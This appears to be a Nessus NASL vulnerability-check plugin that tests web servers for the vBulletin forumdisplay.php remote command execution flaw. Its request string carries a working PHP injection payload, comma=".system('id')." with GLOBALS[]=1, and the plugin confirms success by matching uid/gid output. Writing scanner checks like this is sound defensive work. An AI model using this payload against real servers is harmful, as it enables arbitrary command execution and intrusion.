#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: AL3NDALEEB <al3ndaleeb at uk2 dot net>
# This script is released under the GNU GPL v2
#

if(description)
{
 script_id(16455);
 script_bugtraq_id(12542);
 script_version("$Revision: 1.2 $");
 name["english"] = "vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running vBulletin, a web based bulletin board system 
written in PHP.

The remote version of this software is vulnerable to remote command 
execution flaw throught the script 'forumdisplay.php'.

A malicious user could exploit this flaw to  execute arbitrary command on 
the remote host with the privileges of the web server.

Solution: Upgrade vBulletin 3.0.4 or newer
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl", "vbulletin_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# the code

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  req = string(dir, '/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(\'id\')."');
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL)exit(0);

  if (egrep(pattern:"uid=[0-9].*gid=[0-9]", string:buf) ) security_hole(port);
}
